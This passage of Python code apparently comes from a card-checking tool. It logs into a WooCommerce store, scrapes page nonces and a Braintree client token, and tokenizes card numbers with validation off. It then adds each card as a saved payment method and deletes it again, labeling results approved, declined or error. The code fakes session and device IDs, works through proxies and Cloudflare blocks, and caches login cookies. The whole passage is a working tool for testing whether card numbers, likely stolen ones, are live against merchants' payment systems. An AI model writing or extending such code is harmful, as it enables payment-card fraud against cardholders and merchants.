                resp = session.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
            except requests.RequestException as exc:
                cs_msg = _v6_cs_msg(exc)
                if cs_msg:
                    return ERROR, cs_msg
                is_pe, _ = is_proxy_error(exc, using_proxy)
                return ERROR, categorize_proxy_error(exc) if is_pe else _short_req_error(exc)
            html_text = resp.text or ""
            if _v6_is_challenge(html_text, resp.status_code):
                return ERROR, "Cloudflare blocked the site, retry with proxy"
            if not _v6_is_logged_in(html_text):
                # Cached cookies may be stale — drop and do a fresh login.
                _v6_drop_cookies(email)
                ok, err = _v6_login(session, url, email, password)
                if not ok:
                    return ERROR, f"Session expired and auto-login failed ({err})"
                try:
                    resp = session.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
                except requests.RequestException as exc:
                    cs_msg = _v6_cs_msg(exc)
                    if cs_msg:
                        return ERROR, cs_msg
                    is_pe, _ = is_proxy_error(exc, using_proxy)
                    return ERROR, categorize_proxy_error(exc) if is_pe else _short_req_error(exc)
                html_text = resp.text or ""
                if not _v6_is_logged_in(html_text):
                    return ERROR, "Login did not stick (site changed?)"
            _v6_store_cookies(email, {c.name: c.value for c in session.cookies})

        # 2) Scrape fresh nonces + client token (never stored in GitHub).
        m_nonce = _RE_V6_ADDPM_NONCE.search(html_text)
        m_token = _RE_V6_CLIENT_TOKEN.search(html_text)
        if not m_nonce:
            return ERROR, "Failed to extract page secrets (nonce)"
        if not m_token:
            return ERROR, "Failed to extract page secrets (client token)"
        add_nonce = m_nonce.group(1)
        client = _v6_decode_client_token(m_token.group(1))
        if not client:
            return ERROR, "Failed to decode client token"
        access_token = client.get("authorizationFingerprint", "")
        if not access_token:
            return ERROR, "Failed to extract accessToken from client token"

        # 3) Tokenize card at Braintree GraphQL.
        number = "".join(ch for ch in str(card_info.get("number", "")) if ch.isdigit())
        month = str(card_info.get("month", "")).zfill(2)
        year = str(card_info.get("year", ""))
        if len(year) == 2:
            year = "20" + year
        token_payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": str(_fake.uuid4()),
            },
            "query": _BT_TOKENIZE_QUERY,
            "variables": {
                "input": {
                    "creditCard": {
                        "number": number,
                        "expirationMonth": month,
                        "expirationYear": year,
                        "cvv": str(card_info.get("cvv", "")),
                        "billingAddress": {
                            "postalCode": person.get("zipcode", "10001"),
                            "streetAddress": "",
                        },
                    },
                    "options": {"validate": False},
                }
            },
            "operationName": "TokenizeCreditCard",
        }
        try:
            tok_resp = session.post(
                "https://payments.braintree-api.com/graphql",
                headers={
                    "Authorization": f"Bearer {access_token}",
                    "braintree-version": "2018-05-10",
                    "Content-Type": "application/json",
                    "Origin": "https://assets.braintreegateway.com",
                    "Referer": "https://assets.braintreegateway.com/",
                },
                json=token_payload,
                timeout=REQUEST_TIMEOUT,
            )
        except requests.RequestException as exc:
            cs_msg = _v6_cs_msg(exc)
            if cs_msg:
                return ERROR, cs_msg
            is_pe, _ = is_proxy_error(exc, using_proxy)
            return ERROR, categorize_proxy_error(exc) if is_pe else _short_req_error(exc)
        try:
            tok_data = tok_resp.json()
        except (json.JSONDecodeError, ValueError):
            return ERROR, f"Braintree tokenize failed (HTTP {tok_resp.status_code})"
        if tok_data.get("errors"):
            msg = tok_data["errors"][0].get("message", "Card rejected") if isinstance(
                tok_data["errors"], list) else "Card rejected"
            return FAILED, msg[:300]
        tok_node = (tok_data.get("data") or {}).get("tokenizeCreditCard") or {}
        bt_token = tok_node.get("token", "")
        if not bt_token:
            return FAILED, "Card rejected (no payment method)"

        # 4) Vault the tokenized card via WooCommerce form.
        config_data = _v6_build_config_data(client)
        try:
            vault_resp = session.post(
                url,
                data={
                    "payment_method": "braintree_cc",
                    "braintree_cc_nonce_key": bt_token,
                    "braintree_cc_device_data": json.dumps(
                        {"correlation_id": str(_fake.uuid4())}
                    ),
                    "braintree_cc_3ds_nonce_key": "",
                    "braintree_cc_config_data": json.dumps(config_data),
                    "woocommerce-add-payment-method-nonce": add_nonce,
                    "_wp_http_referer": "/my-account/add-payment-method/",
                    "woocommerce_add_payment_method": "1",
                },
                headers={"Referer": url, "Origin": origin},
                allow_redirects=True,
                timeout=REQUEST_TIMEOUT,
            )
        except requests.RequestException as exc:
            cs_msg = _v6_cs_msg(exc)
            if cs_msg:
                return ERROR, cs_msg
            is_pe, _ = is_proxy_error(exc, using_proxy)
            return ERROR, categorize_proxy_error(exc) if is_pe else _short_req_error(exc)
        final_html = vault_resp.text or ""
        final_url = vault_resp.url or ""

        # Edge rejection is not a card verdict — surface it, don't decline.
        edge = _v6_edge_block(final_html)
        if edge:
            return ERROR, edge

        # Approved: bounced to payment-methods with success notice.
        if "payment-methods" in final_url and "successfully added" in final_html.lower():
            _v6_cleanup(session, origin)
            _v6_store_cookies(email, {c.name: c.value for c in session.cookies})
            return APPROVED, "Approved"
        if "Payment method successfully added" in final_html:
            _v6_cleanup(session, origin)
            _v6_store_cookies(email, {c.name: c.value for c in session.cookies})
            return APPROVED, "Approved"

        # Session died mid-run (login page again) -> surface clearly.
        if _RE_V6_LOGIN_NONCE.search(final_html) and not _v6_is_logged_in(final_html):
            _v6_drop_cookies(email)
            return ERROR, "Session expired mid-check, retry"

        err = _v6_extract_error(final_html)
        if err == "DUPLICATE":
            _v6_cleanup(session, origin)
            return APPROVED, "Approved old try again"
        if "successfully added" in final_html.lower():
            _v6_cleanup(session, origin)
            return APPROVED, "Approved"
        return DECLINED, err

    except requests.RequestException as exc:
        cs_msg = _v6_cs_msg(exc)
        if cs_msg:
            return ERROR, cs_msg
        is_pe, _ = is_proxy_error(exc, using_proxy)
        return ERROR, categorize_proxy_error(exc) if is_pe else _short_req_error(exc)
    except Exception as exc:
        logger.error(f"Unexpected error in braintree_v6_login_flow: {exc}")
        return ERROR, f"Processing failed: {exc}"
    finally:
        try:
            session.close()
        except Exception:
            pass
